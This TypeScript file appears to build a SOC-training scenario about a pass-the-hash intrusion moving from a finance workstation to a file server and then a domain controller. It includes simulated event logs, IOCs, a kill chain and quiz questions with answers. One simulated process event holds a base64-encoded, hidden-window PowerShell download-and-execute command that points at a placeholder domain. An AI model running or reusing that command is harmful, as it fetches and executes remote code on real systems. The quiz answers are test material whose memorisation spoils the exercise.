/**
 * Scenario pack: "Lateral Movement — Pass-the-Hash to the File Server, Second Hop to the DC"
 *
 * INTERMEDIATE tier. An operator who already holds an NTLM hash on a foothold
 * workstation (FIN-WS-11, out of scope here) uses it to authenticate to a file
 * server (SRV-FILE-03) WITHOUT ever typing a password — pass-the-hash. The
 * landing on SRV-FILE-03 is a completely ordinary-looking 4624: same event ID a
 * hundred normal share connections a day produce. What makes it the incident is
 * three things read together — the authentication package is NTLM where this
 * in-domain, Kerberos-first estate almost never uses it; the source workstation
 * is FIN-WS-11, a finance clerk's machine that has no business administering a
 * server; and it lands at 02:04, off-hours. From there the operator opens the
 * ADMIN$ share, installs a service remotely (the PsExec pattern), executes a
 * payload, and re-uses the same hash to reach a Domain Controller.
 *
 * The teaching spine is distinguishing a LEGITIMATE Type-3 network logon from a
 * pass-the-hash one. A benign control event is included on purpose: m.rossi
 * reaching the same file server over Kerberos from her own workstation during
 * business hours — same event ID (4624), same LogonType (3), and yet nothing
 * like the attack. The difference is in the fields, not the event code.
 *
 * SOURCES: sysmon (LSASS access on the foothold — the source of the hash),
 * windows_security (4624 / 4672 / 5140 / 7045 / 4688 on the file server and DC),
 * edr (CrowdStrike Falcon detection), siem (Microsoft Sentinel correlation, fed
 * by Microsoft Defender for Identity).
 *
 * NOTE: register in scenarios.ts with difficulty "intermediate". The
 * ScenarioBundle itself carries no difficulty field.
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { winLogon, winSpecialPrivileges, winShareAccess, winServiceInstall, winProcessCreate } from "@/lib/sim/emitters/windowsSecurity";
import { sysmonProcess, sysmonNetwork, sysmonProcessAccess } from "@/lib/sim/emitters/sysmon";
import { csAlert } from "@/lib/sim/emitters/crowdstrike";
import { sentinelUeba } from "@/lib/sim/emitters/sentinel";

export function buildLateralMovementPthScenario(
  scenarioId = "lateral-movement-pth-2026",
): ScenarioBundle {
  const B = new Date("2026-08-27T02:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // One incident — the whole chain is a single lateral-movement case.
  const INCIDENT = "inc:lm:1";

  // The foothold workstation (out of scope — where the hash was dumped), the
  // file server the operator moves to, and the DC the second hop reaches.
  const foothold = { hostname: "FIN-WS-11", fqdn: "FIN-WS-11.nexacorp.com", ip: "10.20.6.41" };
  const fileSrv  = { hostname: "SRV-FILE-03", fqdn: "SRV-FILE-03.nexacorp.com", ip: "10.20.7.28" };
  const dc       = { hostname: "DC-NEXA-01", fqdn: "DC-NEXA-01.nexacorp.com", ip: "10.20.5.10" };

  // The abused account: an infrastructure admin whose cached credentials sat in
  // LSASS on FIN-WS-11 after she remoted in to fix it — local-admin on servers,
  // exactly the account an operator wants.
  const admin = { sam: "s.kessler", email: "s.kessler@nexacorp.com", title: "Infrastructure Administrator" };
  const adminSid = "S-1-5-21-3421479547-3897544621-1789562108-2205";

  // The benign control: an ordinary finance user reaching the same share the
  // legitimate way — Kerberos, from her own workstation, in business hours.
  const benign = { sam: "m.rossi", email: "m.rossi@nexacorp.com" };
  const benignSid = "S-1-5-21-3421479547-3897544621-1789562108-3318";
  const benignWs = { hostname: "FIN-WS-22", ip: "10.20.6.52" };

  // The remotely-installed service and its payload binary.
  const svcBinaryHash = makeSha256("lateralmovement_pth_svcupd64_service_binary_2026");
  const sensorId = "b83f2c1e7d9a4056b1d4e8720af3c915";

  const cxNexa = "nexacorp" as const;

  const events: TelemetryEvent[] = [
    // 0. BENIGN CONTROL — the legitimate way to reach SRV-FILE-03 (Kerberos, own WS, business hours).
    {
      ...winLogon({
        companyId: cxNexa, id: "evt_lm_00_benign_logon", ts: "2026-08-26T13:12:04.000Z", host: fileSrv.hostname, fqdn: fileSrv.fqdn,
        targetUser: benign.sam, targetSid: benignSid, srcIp: benignWs.ip, logonType: 3, authPackage: "Kerberos", logonProcess: "Kerberos",
        logonId: "0x5A11C02", srcPort: "50142", workstation: benignWs.hostname, recordId: "5540912", severity: "informational",
        description:
          "A 4624 network logon for m.rossi on SRV-FILE-03 at 13:12 the previous afternoon, LogonType 3 over Kerberos, from her own workstation FIN-WS-22.",
      }),
      fp_explanation:
        "Legitimate Type-3 network logon to the file server: Kerberos (the in-domain default), from the user's OWN workstation FIN-WS-22, at 13:12 on a business day. Same 4624 / LogonType 3 as the attack — the difference is the authentication package, the source host, and the hour.",
    },

    // 1. THE SOURCE OF THE HASH — LSASS access on the foothold (Sysmon 10).
    sysmonProcessAccess({
      companyId: cxNexa, id: "evt_lm_01_lsass_access", ts: T(0), host: foothold.hostname, user: admin.email, srcIp: foothold.ip,
      sourceImage: "C:\\Windows\\Temp\\svchost.exe", sourcePid: 6624, targetPid: 712, grantedAccess: "0x1410",
      callTrace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d234|C:\\Windows\\System32\\KERNELBASE.dll+2a1ee|UNKNOWN(0000000abc120000)",
      mitre: "T1003.001", tactic: "Credential Access", severity: "high", incidentId: INCIDENT,
      description:
        "On the foothold host FIN-WS-11 a process running from C:\\Windows\\Temp opened lsass.exe with GrantedAccess 0x1410 at 02:00 — the read/query rights a credential dumper uses to lift hashes from memory.",
    }),

    // 2. THE PASS-THE-HASH LANDING — an ordinary-looking 4624, but NTLM, off-hours.
    winLogon({
      companyId: cxNexa, id: "evt_lm_02_pth_logon", ts: T(4 * MIN), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, logonType: 3, authPackage: "NTLM", logonProcess: "NtLmSsp ",
      lmPackage: "NTLM V2", keyLength: "0", logonId: "0x6C41F70", srcPort: "49277", workstation: foothold.hostname, recordId: "5551338",
      mitre: "T1550.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
      description:
        "A 4624 network logon for s.kessler arrived on SRV-FILE-03 at 02:04, LogonType 3 over NTLM, from FIN-WS-11 (10.20.6.41) — a finance workstation reaching a file server as an infrastructure admin, at night.",
    }),

    // 3. 4672 — the logon carried admin privileges.
    winSpecialPrivileges({
      companyId: cxNexa, id: "evt_lm_03_special_privs", ts: T(4 * MIN + 6 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, logonId: "0x6C41F70", recordId: "5551339",
      privilegeList: "SeSecurityPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeTcbPrivilege",
      mitre: "T1078", tactic: "Privilege Escalation", severity: "medium", incidentId: INCIDENT,
      description:
        "A 4672 on SRV-FILE-03 assigned SeDebugPrivilege, SeTcbPrivilege and SeBackupPrivilege to the s.kessler logon session — this NTLM network logon is running with local-administrator rights.",
    }),

    // 4. 5140 — ADMIN$ opened (the PsExec SMB channel).
    winShareAccess({
      companyId: cxNexa, id: "evt_lm_04_admin_share", ts: T(4 * MIN + 22 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows",
      subjectLogonId: "0x6C41F70", recordId: "5551361", mitre: "T1021.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
      description:
        "SRV-FILE-03 logged a 5140 connection to the ADMIN$ administrative share under the s.kessler session from 10.20.6.41 — the hidden share used to stage and launch remote code, not a normal file access.",
    }),

    // 5. 7045 — a service is installed remotely.
    winServiceInstall({
      companyId: cxNexa, id: "evt_lm_05_service_install", ts: T(5 * MIN), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, srcIp: foothold.ip, serviceName: "WinSvcUpdate", imagePath: "C:\\Windows\\svcupd64.exe",
      accountName: "LocalSystem", serviceType: "user mode service", startType: "auto start", recordId: "884012",
      mitre: "T1569.002", tactic: "Execution", severity: "high", incidentId: INCIDENT,
      description:
        "A 7045 on SRV-FILE-03 recorded a new auto-start service, WinSvcUpdate, whose binary C:\\Windows\\svcupd64.exe runs as LocalSystem — a service created over the ADMIN$ session moments after the NTLM logon.",
    }),

    // 6. Sysmon 1 — the service binary executes as SYSTEM.
    sysmonProcess({
      companyId: cxNexa, id: "evt_lm_06_service_exec", ts: T(5 * MIN + 9 * SEC), host: fileSrv.hostname, user: admin.email, srcIp: fileSrv.ip,
      processName: "svcupd64.exe", processPath: "C:\\Windows\\svcupd64.exe", cmdline: "C:\\Windows\\svcupd64.exe",
      parentName: "services.exe", parentPath: "C:\\Windows\\System32\\services.exe", pid: 8104, parentPid: 720,
      sha256: svcBinaryHash, signed: false, integrity: "System", originalFileName: "svcupd64.exe", runAsUser: "NT AUTHORITY\\SYSTEM",
      mitre: "T1569.002", tactic: "Execution", severity: "high", incidentId: INCIDENT,
      description:
        "Sysmon recorded services.exe on SRV-FILE-03 spawning C:\\Windows\\svcupd64.exe as LocalSystem — the installed service starting, an unsigned binary launched by the Service Control Manager.",
    }),

    // 7. 4688 — the payload spawns an encoded PowerShell child.
    winProcessCreate({
      companyId: cxNexa, id: "evt_lm_07_payload_powershell", ts: T(5 * MIN + 12 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
      targetUser: admin.sam, srcIp: fileSrv.ip, processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB3AGkAbgB1AHAAZABhAHQAZQAuAG4AZQB0AC8AYwAuAHAAcwAxACcAKQA=", parentPath: "C:\\Windows\\svcupd64.exe", pid: 8260, subjectUser: "SRV-FILE-03$", subjectSid: "S-1-5-18",
      runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", tokenElevation: "%%1936", recordId: "5551402",
      mitre: "T1059.001", tactic: "Execution", severity: "high", incidentId: INCIDENT,
      description:
        "A 4688 on SRV-FILE-03 shows svcupd64.exe spawning an encoded, hidden-window PowerShell as SYSTEM — the remotely-installed service acting as a loader.",
    }),

    // 8. Sysmon 3 — the payload reaches toward the DC over SMB (445).
    sysmonNetwork({
      companyId: cxNexa, id: "evt_lm_08_smb_to_dc", ts: T(6 * MIN), host: fileSrv.hostname, user: null, srcIp: fileSrv.ip,
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid: 8260, remoteIp: dc.ip, remotePort: 445, remoteHost: dc.fqdn,
      transport: "tcp", mitre: "T1021.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
      description:
        "Sysmon recorded powershell.exe on SRV-FILE-03 opening an outbound TCP/445 (SMB) connection to DC-NEXA-01 (10.20.5.10) — the operator pivoting from the file server toward a Domain Controller.",
    }),

    // 9. CrowdStrike Falcon detection — the pass-the-hash pattern (edr_scope hybrid).
    {
      ...csAlert({
        companyId: cxNexa, id: "evt_lm_09_edr_detection", ts: T(6 * MIN + 40 * SEC), host: fileSrv.hostname, user: admin.email, srcIp: fileSrv.ip,
        threatName: "PassTheHashRemoteServiceExecution", mitre: "T1550.002", tactic: "Lateral Movement",
        technique: "Use Alternate Authentication Material: Pass the Hash", processTree: "services.exe > svcupd64.exe > powershell.exe",
        severity: "critical", action: "detected", incidentId: INCIDENT,
        description:
          "Falcon raised a Critical detection on SRV-FILE-03: an NTLM network logon for a privileged account from a workstation, followed by a remotely-installed service and an encoded PowerShell reaching a Domain Controller — a pass-the-hash lateral-movement pattern.",
      }),
      edr_scope: "hybrid",
    },

    // 10. THE SECOND HOP — a 4624 on the DC, same hash, from SRV-FILE-03.
    winLogon({
      companyId: cxNexa, id: "evt_lm_10_dc_logon", ts: T(8 * MIN), host: dc.hostname, fqdn: dc.fqdn,
      targetUser: admin.sam, targetSid: adminSid, srcIp: fileSrv.ip, logonType: 3, authPackage: "NTLM", logonProcess: "NtLmSsp ",
      lmPackage: "NTLM V2", keyLength: "0", logonId: "0x8B03D19", srcPort: "52140", workstation: fileSrv.hostname, recordId: "9920551",
      mitre: "T1550.002", tactic: "Lateral Movement", severity: "critical", incidentId: INCIDENT,
      description:
        "A 4624 network logon for s.kessler landed on DC-NEXA-01 at 02:08, LogonType 3 over NTLM, this time sourced from SRV-FILE-03 (10.20.7.28) — the same replayed hash reaching a Domain Controller one hop on.",
    }),

    // 11. Sentinel correlation (Defender for Identity) — the multi-hop chain.
    sentinelUeba({
      companyId: cxNexa, id: "evt_lm_11_sentinel_correlation", ts: T(9 * MIN), user: admin.email, userSam: admin.sam, srcIp: foothold.ip,
      alertName: "LateralMovement_PassTheHash_MultiHop", alertSeverity: "High", ruleId: "SEN-IDENT-0342", severity: "critical", eventType: "ueba_anomaly",
      fullName: "Sofia Kessler", department: "IT Infrastructure", title: admin.title,
      groups: ["Domain Users", "Server Operators", "Backup Operators"],
      mitre: "T1550.002", threatTechnique: "Use Alternate Authentication Material: Pass the Hash", threatTactic: "Lateral Movement", incidentId: INCIDENT,
      extendedProperties: {
        "DefenderForIdentity Detection": "Suspected identity theft (pass-the-hash)",
        "Authentication Package": "NTLM",
        "Hosts In Path": ["FIN-WS-11", "SRV-FILE-03", "DC-NEXA-01"],
        "Window Start": T(4 * MIN),
        "Window End": T(8 * MIN),
        "Usual Logon Hours": "08:00-19:00",
        "Usual Auth Protocol": "Kerberos",
        "Source Addresses In Window": [foothold.ip, fileSrv.ip],
      },
      description:
        "Sentinel raised a correlation alert, enriched by Defender for Identity, for s.kessler: NTLM authentications traversing FIN-WS-11 -> SRV-FILE-03 -> DC-NEXA-01 in nine minutes off-hours, with the account's normal logon pattern attached for comparison.",
    }),
  ];

  const iocs: IOC[] = [
    {
      type: "host",
      value: foothold.hostname, // FIN-WS-11 — the foothold / source of the replayed hash
      first_seen: T(0),
      last_seen: T(9 * MIN),
      reputation: "unknown",
      tags: ["foothold", "hash-source", "affected"],
    },
    {
      type: "host",
      value: fileSrv.hostname, // SRV-FILE-03 — the pass-the-hash landing
      first_seen: T(4 * MIN),
      last_seen: T(9 * MIN),
      reputation: "unknown",
      tags: ["lateral-target", "file-server", "affected"],
    },
    {
      type: "host",
      value: dc.hostname, // DC-NEXA-01 — the second hop
      first_seen: T(8 * MIN),
      last_seen: T(8 * MIN),
      reputation: "unknown",
      tags: ["domain-controller", "second-hop", "tier-0"],
    },
    {
      type: "ip",
      value: foothold.ip, // 10.20.6.41 — the PtH source address
      first_seen: T(0),
      last_seen: T(9 * MIN),
      reputation: "suspicious",
      tags: ["pth-source", "internal"],
    },
    {
      type: "user",
      value: admin.sam, // s.kessler — the abused privileged account
      first_seen: T(0),
      last_seen: T(9 * MIN),
      reputation: "suspicious",
      tags: ["infrastructure-admin", "compromised-credential", "ntlm-hash"],
    },
    {
      type: "sha256",
      value: svcBinaryHash, // the remotely-installed service payload
      first_seen: T(5 * MIN),
      last_seen: T(6 * MIN),
      reputation: "malicious",
      tags: ["remote-service", "loader", "psexec-pattern"],
    },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt:
        "The landing logon on SRV-FILE-03 (evt_lm_02_pth_logon) is a 4624 with LogonType 3 — identical event ID and logon type to the benign control (evt_lm_00_benign_logon). Which combination of fields separates the pass-the-hash logon from a legitimate network logon?",
      hint: "Compare AuthenticationPackageName, WorkstationName / IpAddress, and the time of day between the two 4624s.",
      kind: "single",
      options: [
        { value: "ntlm_ws_hour", label: "AuthenticationPackageName is NTLM (the benign one is Kerberos), the source is FIN-WS-11 — a finance workstation, not an admin host — and it lands at 02:04 off-hours" },
        { value: "logontype", label: "The attack logon is LogonType 3 and the benign one is LogonType 10, which is what marks it as remote" },
        { value: "targetuser", label: "The TargetUserName differs — a pass-the-hash logon always uses a service account, never a named user" },
        { value: "keylength", label: "The KeyLength field is 0 on the attack, and any 4624 with KeyLength 0 is by definition malicious" },
      ],
      answer: "ntlm_ws_hour",
      xp: 60,
      explanation:
        "A 4624 / LogonType 3 is the single most common line in a file server's Security log — the event code proves nothing on its own. The tells are in the other fields, read against a baseline. NTLM (AuthenticationPackageName=NTLM, LogonProcessName=NtLmSsp) in a domain that authenticates with Kerberos by default is the classic pass-the-hash signature, because a replayed hash drives NTLM, not Kerberos. The source WorkstationName/IpAddress is FIN-WS-11 — a finance clerk's workstation with no reason to administer a server — and the time is 02:04. The benign control is the same 4624/Type-3 but Kerberos, from the user's own workstation, at 13:12. (b) is wrong: both are LogonType 3. (c) is false — the abused account here is a named admin, s.kessler. (d) over-reads one field: KeyLength 0 is normal for many NTLM logons and is not a verdict by itself.",
    },
    {
      id: "q2",
      prompt:
        "The operator authenticated to SRV-FILE-03 without ever typing s.kessler's password. Which event explains WHERE the material that let them do that came from?",
      kind: "single",
      options: [
        { value: "lsass", label: "evt_lm_01_lsass_access — a process on FIN-WS-11 opening lsass.exe with GrantedAccess 0x1410, the credential dump that yielded s.kessler's NTLM hash" },
        { value: "privs", label: "evt_lm_03_special_privs — the 4672 on SRV-FILE-03 assigning admin privileges to the session, which happens after the NTLM logon already succeeded" },
        { value: "service", label: "evt_lm_05_service_install — the 7045 remote service creation over ADMIN$, which the operator did once already authenticated as s.kessler" },
        { value: "sentinel", label: "evt_lm_11_sentinel_correlation — the Sentinel alert, fed by Defender for Identity, that named the technique only after the whole chain had run" },
      ],
      answer: "lsass",
      xp: 55,
      explanation:
        "Pass-the-hash replays an NTLM hash instead of a password, so the enabling event is the credential theft that produced the hash. evt_lm_01 is a Sysmon Event 10 on the foothold FIN-WS-11 showing lsass.exe opened with GrantedAccess 0x1410 by a process masquerading as svchost from C:\\Windows\\Temp — the LSASS read a dumper performs (T1003.001). s.kessler's hash was resident there because she had remotely logged into that workstation. (b) shows the stolen hash carried admin rights, and (c) is what the operator did AFTER authenticating — both are downstream of the hash, not its origin. (d) names the technique but is the SIEM's correlation, not the theft itself.",
    },
    {
      id: "q3",
      prompt:
        "On SRV-FILE-03 the operator opened ADMIN$ (5140), then a 7045 installed the service WinSvcUpdate pointing at C:\\Windows\\svcupd64.exe, which services.exe then launched. What execution technique does this sequence represent?",
      kind: "single",
      options: [
        { value: "service_exec", label: "Service Execution (T1569.002) — remote service creation over the ADMIN$ share, the PsExec pattern: drop a binary, register it as a service, let the SCM run it as SYSTEM" },
        { value: "scheduled", label: "Scheduled Task execution — the service was really a disguised at/schtasks job" },
        { value: "wmi", label: "WMI event subscription persistence — 7045 is the standard artifact of a WMI __EventConsumer" },
        { value: "legit_patch", label: "A routine software deployment — an auto-start service named WinSvcUpdate installed by an admin account is ordinary patch tooling" },
      ],
      answer: "service_exec",
      xp: 55,
      explanation:
        "The ADMIN$ connection, a 7045 for a freshly-created auto-start service whose binary sits directly in C:\\Windows, and services.exe (the Service Control Manager) spawning that unsigned binary as LocalSystem is the textbook remote-service-execution / PsExec pattern — MITRE T1569.002. It is how an operator turns an SMB foothold into SYSTEM-level code execution on the target. (b) and (c) name different techniques with different artifacts — a scheduled task shows 4698/schtasks, a WMI subscription shows WMI-Activity 5861, neither produces a 7045. (d) is the disguise the service name is chosen to sell: the binary is unsigned, dropped in an unusual location, installed at 02:05 over a pass-the-hash session — not a change-managed deployment.",
    },
    {
      id: "q4",
      prompt:
        "You are scoping containment. The stolen credential is an NTLM hash for s.kessler, it has already reached DC-NEXA-01, and s.kessler is an infrastructure admin. Which response matches the evidence?",
      kind: "single",
      options: [
        { value: "reset_isolate_hunt", label: "Force a password reset for s.kessler (which changes and thus invalidates the stolen hash), isolate FIN-WS-11 and SRV-FILE-03, and hunt on DC-NEXA-01 for what the hash did after it arrived — treating tier-0 as potentially exposed" },
        { value: "block_ip", label: "Block 10.20.6.41 at the firewall — cutting off the foothold workstation's traffic stops the hash from being replayed any further and closes the incident" },
        { value: "reset_mfa", label: "Reset s.kessler's MFA and require MFA on her next interactive logon — since MFA stops credential replay, that step alone neutralises the pass-the-hash" },
        { value: "reimage_fileserver", label: "Reimage SRV-FILE-03 only — the remote service and PowerShell loader both ran there, so wiping the file server removes the operator's foothold and ends the incident" },
      ],
      answer: "reset_isolate_hunt",
      xp: 65,
      explanation:
        "An NTLM hash is derived from the password, so a password reset changes the hash and is what actually invalidates a pass-the-hash — but only if you also assume everywhere the hash already went. Here it reached a Domain Controller, so containment has to reset the credential, isolate the foothold and the file server, and hunt on DC-NEXA-01 for follow-on actions (further logons, DCSync attempts, new accounts) while treating tier-0 exposure as live. (b) fails because 10.20.6.41 is an internal workstation the operator borrowed; blocking it does nothing about the hash already replayed onward and would disrupt a legitimate host. (c) fails because pass-the-hash is an NTLM replay that never touches an interactive logon prompt — MFA is simply not in that authentication path. (d) ignores both the credential theft on FIN-WS-11 and the second hop to the DC.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Lateral Movement — Pass-the-Hash to the File Server, Second Hop to the DC",
    threat_actor: "Hands-on-keyboard intrusion operator (post-foothold, credential-replay)",
    attack_kind: "lateral_movement",
    briefing:
      "Microsoft Sentinel raised a High alert at 02:09 for the infrastructure admin s.kessler: NTLM authentications hopping FIN-WS-11 → SRV-FILE-03 → DC-NEXA-01 inside nine minutes, off-hours. Work out how the operator moved between the hosts, where the credential came from, and how far it reached before you contain it.",
    narrative: `The operator already had a foothold on FIN-WS-11, a finance clerk's workstation. At 02:00 a process masquerading as svchost.exe from C:\\Windows\\Temp opened lsass.exe with GrantedAccess 0x1410 and lifted the NTLM hash of s.kessler — an infrastructure administrator whose credentials were still cached there because she had remoted in to fix the machine.

At 02:04 that hash was replayed. A 4624 network logon for s.kessler landed on the file server SRV-FILE-03 — LogonType 3, but over NTLM, from FIN-WS-11's address, at night. No password was ever typed; the hash alone authenticated. It looks like any of the hundred ordinary share connections the server logs each day, and that is exactly why pass-the-hash slips past a tired analyst. A 4672 confirmed the logon carried local-administrator privileges, and a 5140 showed the operator opening the ADMIN$ administrative share.

Over that SMB session the operator created a service remotely: a 7045 recorded WinSvcUpdate, an auto-start service whose binary C:\\Windows\\svcupd64.exe runs as LocalSystem. services.exe launched it, and it spawned an encoded PowerShell — the PsExec remote-execution pattern, giving SYSTEM on the file server. At 02:06 that PowerShell reached out over TCP/445 to the Domain Controller DC-NEXA-01, and at 02:08 the same replayed hash produced another NTLM 4624 on the DC itself.

The one legitimate comparison in the data is m.rossi's logon to the same file server the previous afternoon: the identical 4624 / LogonType 3, but Kerberos, from her own workstation, at 13:12. Same event, entirely different meaning. Falcon detected the file-server activity as a Critical pass-the-hash detection at 02:06, and Sentinel — enriched by Defender for Identity — correlated the whole multi-hop chain at 02:09.`,
    learning_objectives: [
      "Distinguish a pass-the-hash 4624 from a legitimate network logon using AuthenticationPackageName (NTLM vs Kerberos), source workstation, and time-of-day — not the event ID",
      "Trace a replayed NTLM hash back to its origin: an LSASS credential-dump (T1003.001) on a foothold host",
      "Recognise the remote-service-creation / PsExec pattern (ADMIN$ 5140 → 7045 → services.exe child) as Service Execution (T1569.002)",
      "Follow lateral movement across hosts (workstation → file server → Domain Controller) using a shared account and NTLM authentications",
      "Scope containment for a pass-the-hash intrusion — reset the credential to invalidate the hash, isolate the hosts in the path, and treat a reached DC as tier-0 exposure",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: T(0), phase: "Credential Access", action: `LSASS opened on ${foothold.hostname} (GrantedAccess 0x1410) — ${admin.sam}'s NTLM hash dumped (T1003.001)` },
      { ts: T(4 * MIN), phase: "Lateral Movement", action: `Pass-the-hash 4624 on ${fileSrv.hostname} — NTLM Type-3 from ${foothold.hostname} (T1550.002)` },
      { ts: T(4 * MIN + 6 * SEC), phase: "Privilege Escalation", action: "4672 — the NTLM logon carries local-admin privileges (T1078)" },
      { ts: T(4 * MIN + 22 * SEC), phase: "Lateral Movement", action: "ADMIN$ administrative share opened (5140) (T1021.002)" },
      { ts: T(5 * MIN), phase: "Execution", action: "7045 remote service WinSvcUpdate installed → services.exe runs svcupd64.exe as SYSTEM (T1569.002)" },
      { ts: T(5 * MIN + 12 * SEC), phase: "Execution", action: "svcupd64.exe spawns encoded PowerShell loader (T1059.001)" },
      { ts: T(6 * MIN), phase: "Lateral Movement", action: `SMB/445 from ${fileSrv.hostname} toward ${dc.hostname} — second hop (T1021.002)` },
      { ts: T(8 * MIN), phase: "Lateral Movement", action: `Pass-the-hash 4624 on ${dc.hostname} — the DC reached (T1550.002)` },
      { ts: T(9 * MIN), phase: "Detection", action: "Sentinel + Defender for Identity correlate the multi-hop chain and raise the alert" },
    ],
    questions,
  };
}
